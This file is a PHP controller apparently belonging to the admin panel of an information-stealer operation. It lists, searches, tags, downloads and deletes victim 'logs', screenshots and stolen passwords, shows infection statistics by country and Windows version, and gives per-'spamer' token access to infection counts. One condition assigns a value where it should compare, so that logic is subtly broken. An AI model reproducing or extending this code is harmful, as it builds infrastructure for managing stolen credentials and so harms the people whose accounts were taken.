<?php

namespace application\controllers;

use application\core\Controller;
use application\lib\Answer;
use \R;

class LogsController extends Controller {
    public function indexAction() {
        $this->view->render('Логи', ["tags" => $this->user->ownTagsList]);
    }

    public function screenshotAction() {
        $this->model->show_screen($this->route["id"]);
    }

    public function statisticAction() {
        if($this->user != null && empty($_POST["token"])) {
            if($this->route["type"] == "logs")
                echo json_encode($this->model->get_line_logs()->Return());
            else if($this->route["type"] == "windows")
                echo json_encode($this->model->get_windows_pie()->Return());
            else if($this->route["type"] == "count")
                echo json_encode($this->model->get_logs_count());
            else if($this->route["type"] == "all")
                echo json_encode($this->model->get_all_statistic(), true);
            else if($this->route["type"] == "country")
                echo json_encode($this->model->get_logs_by_country());
        }
        else {
            if(!empty($_POST["token"])) {
                if($this->route["type"] == "count")
                    echo json_encode($this->model->get_logs_count($_POST["token"]));
            }
        }
    }

    public function logAction() {
        if($this->route['act'] == "delete" && !empty($_POST["id"])) {
            echo json_encode($this->model->delete_log($_POST["id"])->Return());
        }
        if($this->route['act'] == "delete" && !empty($_POST["ids"])) {
            $result = [];
            foreach($_POST["ids"] as $id) {
                $result[] = $this->model->delete_log($id)->Return();
            }
            echo json_encode($result);
        }
        else if($this->route['act'] == "download" && !empty($_POST["id"])) {
            $this->model->download_log($_POST["id"]);
        }
        else if($this->route['act'] == "download" && !empty($_POST["ids"]) && !empty($_POST["addditional"])) {
            if($_POST["addditional"] == "prepare")
                echo json_encode($this->model->download_logs($_POST["ids"], null)->Return());
            else 
                $this->model->download_logs($_POST["ids"], $_POST["addditional"]);
        }
    }

    public function checkAction() {
        $this->model->toggle_check_log($this->route["id"]);
    }

    public function tagsAction() {
        if($this->route["act"] == 'create') {
            if(!empty($_POST["name"])) {
                echo json_encode($this->model->create_tag($_POST["name"])->Return());
            }
        }
        else if($this->route["act"] == "change") {
            if(!empty($_POST["o_name"]) && !empty($_POST["n_name"])) {
                echo json_encode($this->model->change_tag($_POST["o_name"], $_POST["n_name"])->Return());
            }
        }
        else if($this->route["act"] == "delete") {
            if(!empty($_POST["name"])) {
                echo json_encode($this->model->delete_tag($_POST["name"])->Return());
            }
        }
    }

    public function getTableAction() {
        if($this->user != null && empty($_POST["token"])) {
            switch ($this->route["table"]) {
                case 'logs':
                    if(isset($_POST["type"]) && $_POST["type"] = "last")
                        echo json_encode($this->model->get_logs_table(null, null, true));
                    else
                        echo json_encode($this->model->get_logs_table($_POST["tag"], $_POST["spamer"]));
                    break;
                case 'tags':
                    echo json_encode($this->model->get_tags_table());
                    break;
                case 'passwords':
                    echo json_encode($this->model->get_passwords_table($_POST["id"]));
                    break;
                case 'find_passwords':
                    echo json_encode($this->model->get_find_passwords_table($_POST["text"]));
                    break;
                case 'log':
                    echo json_encode($this->model->get_log_table($_POST["id"]));
                    break;
            }
        }
        else {
            if(!empty($_POST["token"])) {
                if(!isset($this->route["table"]) || $this->route["table"] == "logs") {
                    echo json_encode($this->model->get_logs_table(null, $_POST["token"], false));
                }
            }
        }
    }
}